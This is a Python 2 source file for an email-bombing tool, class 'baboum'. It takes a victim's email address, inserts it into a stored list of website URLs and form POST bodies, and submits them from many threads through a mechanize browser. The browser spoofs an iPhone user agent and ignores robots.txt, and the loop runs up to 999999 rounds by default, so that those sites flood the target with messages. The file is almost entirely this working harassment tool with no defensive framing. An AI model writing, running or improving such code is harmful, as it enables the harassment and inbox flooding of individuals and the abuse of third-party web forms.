# -*- coding: UTF-8 -*-
'''
Copyright (c) 2013, Patrick Louis <patrick at unixhub.net>

All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

    1.  The author is informed of the use of his/her code. The author does not have to consent to the use; however he/she must be informed.
    2.  If the author wishes to know when his/her code is being used, it the duty of the author to provide a current email address at the top of his/her code, above or included in the copyright statement.
    3.  The author can opt out of being contacted, by not providing a form of contact in the copyright statement.
    4.  If any portion of the author's code is used, credit must be given.
            a. For example, if the author's code is being modified and/or redistributed in the form of a closed-source binary program, then the end user must still be made somehow aware that the author's work has contributed to that program.
            b. If the code is being modified and/or redistributed in the form of code to be compiled, then the author's name in the copyright statement is sufficient.
    5.  The following copyright statement must be included at the beginning of the code, regardless of binary form or source code form.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''
import time,mechanize,threading

class baboum(object):
    def __init__(self,email,configs,db_handle):
        self.config    = configs
        self.db_handle = db_handle
        self.email     = email
        self._flag     = False
        self.nbtimes   = 0

    #---cut an array---#
    def chunkIt(self,seq, num):
      avg = len(seq) / float(num)
      out = []
      last = 0.0
      while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
      return out

    #---generate a browser---#
    def createbrowser(self,website,post):
        br = mechanize.Browser()
        br.set_handle_gzip(True)
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1 like Mac OS X; en-US) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3')]
        if post != "-":
            br.open(website,post)
        else:
            br.open(website)
        print "A new message has been sent with "+ website

    #---the bomber---#
    def bomber(self,array):
        for ite in range(self.config.rotation()):
            if self._flag == True or self.nbtimes>=self.config.nbtimes:
                break
            for link in array:
                if self._flag == True or self.nbtimes>=self.config.nbtimes :
                    break
                thelink  = link[1]
                thelink  = thelink.replace(self.config.delimiter_email(),self.email)
                thelink  = thelink.replace(self.config.delimiter_email(),self.config.randomname())
                thepost  = link[2]
                thepost  = thepost.replace(self.config.delimiter_email(),self.email)
                thepost  = thepost.replace(self.config.delimiter_email(),self.config.randomname())
                if thepost == "" or thepost == " " :
                    try:
                        self.createbrowser(thelink,"-")
                        self.nbtimes += 1
                    except:
                        pass
                else :
                    try:
                        self.createbrowser(thelink,thepost)
                        self.nbtimes += 1
                    except:
                        pass
            time.sleep(int(self.config.sleeper()))

    def chrono_timer(self):
        time.sleep(int(self.config.chrono()))
        self._flag = True

    #---do the procedure---#
    def start_thread(self):
        links_array = self.db_handle.get_db_data()
        if (self.config.threads()=="-"):
            self.config._threads=5
        if (self.config.rotation()=="-"):
            self.config._rotation=999999
        if (self.config.nbtimes()=="-"):
            self.config._nbtimes=999999
        if len(links_array)<= int(self.config.threads()):
            self.config._threads = len(links_array)
        print self.config.threads()
        z = self.chunkIt(links_array, int(self.config.threads()))
        print len(z)
        for data in z:
            threading.Thread(target=self.bomber, args=(data,)).start()
        if self.config.chrono() != "-":
            self.chrono_timer()

